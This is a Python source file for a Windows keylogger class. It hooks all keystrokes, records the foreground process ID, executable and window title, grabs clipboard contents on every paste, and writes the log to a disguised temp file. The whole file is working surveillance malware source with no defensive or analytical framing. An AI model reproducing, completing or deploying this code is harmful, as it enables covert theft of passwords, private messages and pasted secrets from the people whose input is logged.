from ctypes import *
import pythoncom
import pyHook
import win32clipboard


class fso_keylogger(object):

    def __init__(self):
        self.user32         = windll.user32
        self.kernel32       = windll.kernel32
        self.psapi          = windll.psapi
        self.current_window = None
        self.dest           = 'C:/Windows/Temp/dat_fokylg.tmp'


    def get_current_process(self):
        # get foreground window handler.
        self.hwnd = self.user32.GetForegroundWindow()

        # look for process.
        self.pid = c_ulong(0)
        self.user32.GetWindowThreadProcessId(self.hwnd, byref(self.pid))

        # save the current process id.
        self.process_id = "%d" % self.pid.value

        # get executable.
        self.executable = create_string_buffer("\x00" * 512)
        self.h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, self.pid)

        self.psapi.GetModuleBaseNameA(self.h_process, None, byref(self.executable), 512)

        # read its title.
        self.window_title = create_string_buffer("\x00" * 512)
        self.length = self.user32.GetWindowTextA(self.hwnd, byref(self.window_title), 512)

        # if we are at the correct process, write the title to keylog file.
        self.writeto_keylog("\n[PID: %s - %s - %s]" % (self.process_id, self.executable.value, self.window_title.value))
        self.writeto_keylog("\n")

        # close handles
        self.kernel32.CloseHandle(self.hwnd)
        self.kernel32.CloseHandle(self.h_process)


    def KeyStroke(self, event):
        #global current_window

        # check if the target has switched the window
        if event.WindowName != self.current_window:
            self.current_window = event.WindowName
            self.get_current_process()

        # if a normal key is pressed
        if event.Ascii > 32 and event.Ascii < 127:
            self.writeto_keylog(chr(event.Ascii))

        else:
            # if [CTRL-V], get clipboard content
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                self.pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                self.writeto_keylog("\n[PASTE] - %s \n" % (self.pasted_value))

            else:
                self.writeto_keylog("[" + event.Key + "]")

        return True


    def writeto_keylog(self, content):
        self.filepath = self.dest
        self.keylog = open(self.filepath, 'a+')
        self.keylog.write(content)
        self.keylog.close()


    def Start(self):
        # create and register hook manager
        self.kl = pyHook.HookManager()
        self.kl.KeyDown = self.KeyStroke

        # register hook and keep running
        self.kl.HookKeyboard()
        pythoncom.PumpMessages()
